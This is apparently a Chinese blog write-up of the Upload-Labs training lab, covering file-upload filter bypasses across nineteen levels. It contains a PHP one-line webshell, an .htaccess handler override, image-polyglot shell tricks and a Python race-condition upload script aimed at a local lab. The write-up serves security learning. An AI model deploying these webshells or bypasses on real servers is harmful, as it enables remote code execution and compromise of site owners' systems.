---
layout: post
title: "Uplode-Labs 通关笔记"
date: 2019-4-8 20:49:43
author: co0ontty
categories: CTF WEB ALL
tags: CTF WEB ALL 
describe: 根据 Uplode-Labs 总结文件上传绕过技巧 
cover: 'https://i.loli.net/2019/04/08/5cab11a102167.png'
---

## 漏洞类型分析
![漏洞类型分析](https://i.loli.net/2019/04/08/5caafd2f23ed2.png)
## 漏洞类型判断    
![思路图](https://i.loli.net/2019/04/08/5caafa634c7f7.png)  
## 简单 shell 制作  
shell.php  
```php
<?php assert($_GET["cmd"])?>
```
使用方法：  
http://104.36.68.99/upload/shell.php?cmd=phpinfo();  
## Pass-1  （前端 JS 判断）
使用 burp 进行抓包直接上传 webshell，发现在没有数据传输的情况下判定为不合规文件这说明在客户端通过 JS 进行判断   

[![屏幕快照 2019-04-08 16.58.50.png](https://i.loli.net/2019/04/08/5cab0e218624d.png)](https://i.loli.net/2019/04/08/5cab0e218624d.png)
[![屏幕快照 2019-04-08 16.59.04.png](https://i.loli.net/2019/04/08/5cab0e2234de6.png)](https://i.loli.net/2019/04/08/5cab0e2234de6.png)
[![屏幕快照 2019-04-08 16.59.06.png](https://i.loli.net/2019/04/08/5cab0e22e9b1e.png)](https://i.loli.net/2019/04/08/5cab0e22e9b1e.png)

将图中标红色的 1.php 改为 1.png  

[![屏幕快照 2019-04-08 17.00.48.png](https://i.loli.net/2019/04/08/5cab0e1fc6cfd.png)](https://i.loli.net/2019/04/08/5cab0e1fc6cfd.png)

成功上传，执行 shell   

[![屏幕快照 2019-04-08 17.12.25.png](https://i.loli.net/2019/04/08/5cab108972e22.png)](https://i.loli.net/2019/04/08/5cab108972e22.png)

### 大佬教的骚操作：
禁用本页 JS，直接上传   
[![01-1.png](https://i.loli.net/2019/04/09/5cabf54fdd3de.png)](https://i.loli.net/2019/04/09/5cabf54fdd3de.png)  

## Pass-2  （服务器端端后缀判断）

使用 burp 抓包上传 1.php，网页发送数据，burp 获得流量，可以判断为服务器端响应。  
①将文件后缀修改为 jpg 后上传，再将 1.png 修改为 1.php,成功上传    
②上传 1.php，将包文件中的 Content-Type: 修改为 image/jpeg 成功上传   
最终达到的效果为：
[![屏幕快照 2019-04-09 08.52.37.png](https://i.loli.net/2019/04/09/5cabece6799fe.png)](https://i.loli.net/2019/04/09/5cabece6799fe.png)  
可以判断为服务器端检查文件类型  
## Pass-3（白名单-.phtml、.php5）
将 1.php 的后缀修改为 jpg 进行上传，抓包修改后缀上传提示错误   
[![屏幕快照 2019-04-09 09.02.22.png](https://i.loli.net/2019/04/09/5cabef6455bba.png)](https://i.loli.net/2019/04/09/5cabef6455bba.png)
证明服务器端检查后缀   
尝试上传任意后缀文件（php 语言除了可以解析以 php 为后缀的文件，还可以解析 phtml、php2，php3、php4、php5 这些后缀的文件。） 

上传成功，证明使用的检查模式为黑名单检查。  

## Pass-4 （白名单-.htaccess)
本题目为 JS 前端判断后缀，服务端黑名单过滤数据。  
后端未过滤".htaccess"文件，上传".htaccess"文件，文件内容为
```php
<FilesMatch "03.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```
该代码文件将 03.jpg 解析为 php 文件  
[![屏幕快照 2019-04-09 19.53.36.png](https://i.loli.net/2019/04/09/5cac893e518c1.png)](https://i.loli.net/2019/04/09/5cac893e518c1.png)
上传成功后，上传图片马 03.jpg ，运行成功    
[![屏幕快照 2019-04-09 19.55.50.png](https://i.loli.net/2019/04/09/5cac8971e083b.png)](https://i.loli.net/2019/04/09/5cac8971e083b.png)  
## Pass-5（未区分大小写）
Pass-4 中存在以下代码：  
```php
 $file_ext = strtolower($file_ext); //转换为小写
```
而 Pass-5 中没有，说明 Pass-5 虽然过滤了所有的文件后缀，但是没有区分大小写。
上传 shell.PHP 即可绕过  
## Pass-6（文件名+后缀+空格）
相比于第五关的过滤条件缺少了
```php
 $file_ext = trim($file_ext); //首尾去空
```
所以通过构造文件名+后缀+空格进行绕过，即"shell.php "
## Pass-7  （shell.php.）
缺少"."过滤代码：
```php
$file_name = deldot($file_name);//删除文件名末尾的点
```
所以利用 windows 文件系统的文件名特性（windows 系统上的文件名最后一个.会被去掉）通过构造 shell.php.进行绕过  
## Pass-8 （::$DATA）
Windows 文件流特性绕过，文件名改成 shell.php::$DATA，上传成功后保存的文件名其实是 shell.php
## Pass-9  （点+空格+点）
黑名单过滤，注意第 15 行和之前不太一样，路径拼接的是处理后的文件名，于是构造 info.php. . （点+空格+点），经过处理后，文件名变成 info.php.，即可绕过，经过 windows 文件系统的特性处理后即可上传访问成功。
## Pass-10  （双写后缀名）
第 8 行代码存在上传漏洞：
```php
6：$deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");
7: $file_name = trim($_FILES['upload_file']['name']);
8:$file_name = str_ireplace($deny_ext,"", $file_name);

```
该代码的作用为将第六行中的$deny_ext 中的后缀名替换为空。
所以本题目可以使用双写后缀名的方法进行绕过。
![屏幕快照 2019-04-12 09.29.58.png](https://i.loli.net/2019/04/12/5cafeae609ce6.png)
## Pass-11 （00 截断-%00）
抓包上传发现，文件的命名格式是将路径与文件名连接起来进行上传
[![屏幕快照 2019-04-12 18.20.15.png](https://i.loli.net/2019/04/12/5cb066949f76d.png)](https://i.loli.net/2019/04/12/5cb066949f76d.png)  
解题方法为：
[![屏幕快照 2019-04-12 18.44.22.png](https://i.loli.net/2019/04/12/5cb06c2b6b4ba.png)](https://i.loli.net/2019/04/12/5cb06c2b6b4ba.png)
讲道理这样就算上传成功了但是我遇到了些问题，可能服务器安全策略配置问题，放弃挣扎。
[![屏幕快照 2019-04-12 18.26.16.png](https://i.loli.net/2019/04/12/5cb06c2b1ae6a.png)](https://i.loli.net/2019/04/12/5cb06c2b1ae6a.png)
如果哪位大佬知道怎么回事可以评论告诉我  
## Pass-12 （00 截断-0x00)
同 Pass-11 但是这次需要将%00 换成空格，然后在 hex 选项卡中将 20 改为 00  

## Pass-13 (添加文件头进行绕过)

绕过文件头检查，添加 GIF 图片的文件头`GIF89a`，绕过 GIF 图片检查。

![](/assets/img/posts/13-1.png)

使用命令`copy normal.jpg /b + shell.php /a webshell.jpg`，将 php 一句话追加到 jpg 图片末尾，代码不全的话，人工补充完整。形成一个包含 Webshell 代码的新 jpg 图片，然后直接上传即可。[JPG 一句话 shell 参考示例](https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.jpg)

![](/assets/img/posts/13-2.png)

png 图片处理方式同上。[PNG 一句话 shell 参考示例](https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.png)

![](/assets/img/posts/13-3.png)

## Pass-14

原理和示例同**Pass-13**，添加 GIF 图片的文件头绕过检查

![](/assets/img/posts/14-1.png)

png 图片 webshell 上传同**Pass-13**。

jpg/jpeg 图片 webshell 上传存在问题，正常的图片也上传不了，等待作者调整。

## Pass-15

原理同**Pass-13**，添加 GIF 图片的文件头绕过检查

![](/assets/img/posts/15-1.png)

png 图片 webshell 上传同**Pass-13**。

jpg/jpeg 图片 webshell 上传同**Pass-13**。

## Pass-16 （对比渲染图片，添加代码）

原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将 Webshell 代码插在该部分，然后上传。具体实现需要自己编写 Python 程序，人工尝试基本是不可能构造出能绕过渲染函数的图片 webshell 的。

这里提供一个包含一句话 webshell 代码并可以绕过 PHP 的 imagecreatefromgif 函数的 GIF 图片[示例](https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromgif-pass-00.gif)。

![](/assets/img/posts/16-1.png)

打开被渲染后的图片，Webshell 代码仍然存在

![](/assets/img/posts/16-2.png)

提供一个 jpg 格式图片绕过 imagecreatefromjpeg 函数渲染的一个[示例文件](https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromjpeg-pass-LandGrey.jpg)。 直接上传示例文件会触发 Warning 警告，并提示文件不是 jpg 格式的图片。但是实际上已经上传成功，而且示例文件名没有改变。

![](/assets/img/posts/16-3.png)

![](/assets/img/posts/16-4.png)

从上面上传 jpg 图片可以看到我们想复杂了，程序没有对渲染异常进行处理，直接在正常 png 图片内插入 webshell 代码，然后上传[示例文件](https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefrompng-pass-LandGrey.png)即可，并不需要图片是正常的图片。

![](/assets/img/posts/16-5.png)

程序依然没有对文件重命名，携带 webshell 的无效损坏 png 图片直接被上传成功。

![](/assets/img/posts/16-6.png)

同时你也可以使用工具对文件进行渲染：
https://wiki.ioin.in/soft/detail/1q
先上传正常图片，经过渲染后下载正常图片，使用该工具处理经过渲染的图片，成功上传。
## Pass-17 （多线程并发上传绕过删除条件竞争）

利用条件竞争删除文件时间差绕过。使用命令`pip install hackhttp`安装[hackhttp](https://github.com/BugScanTeam/hackhttp)模块，运行下面的 Python 代码即可。如果还是删除太快，可以适当调整线程并发数。

```python
#!/usr/bin/env python
# coding:utf-8
# Build By LandGrey

import hackhttp
from multiprocessing.dummy import Pool as ThreadPool


def upload(lists):
    hh = hackhttp.hackhttp()
    raw = """POST /upload-labs/Pass-17/index.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/upload-labs/Pass-17/index.php
Cookie: pass=17
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------6696274297634
Content-Length: 341

-----------------------------6696274297634
Content-Disposition: form-data; name="upload_file"; filename="17.php"
Content-Type: application/octet-stream

<?php assert($_POST["LandGrey"])?>
-----------------------------6696274297634
Content-Disposition: form-data; name="submit"

上传
-----------------------------6696274297634--
"""
    code, head, html, redirect, log = hh.http('http://127.0.0.1/upload-labs/Pass-17/index.php', raw=raw)
    print(str(code) + "\r")


pool = ThreadPool(10)
pool.map(upload, range(10000))
pool.close()
pool.join()
```

在脚本运行的时候，访问 Webshell

![](/assets/img/posts/17-1.png)

## Pass-18 （多线程并发绕过重命名条件竞争）

刚开始没有找到绕过方法，最后下载作者 Github 提供的打包环境，利用上传重命名竞争+Apache 解析漏洞，成功绕过。

上传名字为`18.php.7Z`的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。

![](/assets/img/posts/18-1.png)



快速提交上面的数据包，可以让文件名字不被重命名上传成功。

![](/assets/img/posts/18-2.png)

然后利用 Apache 的解析漏洞，即可获得 shell

![](/assets/img/posts/18-3.png)

## Pass-19

原理同**Pass-11**，上传的文件名用 0x00 绕过。改成`19.php【二进制00】.1.jpg`

![](/assets/img/posts/19-1.png)

## 后记

可以发现以上绕过方法中有些是重复的，有些是意外情况，可能与项目作者的本意不符，故本文仅作为参考使用。

等作者修复代码逻辑后，本文也会适时更新。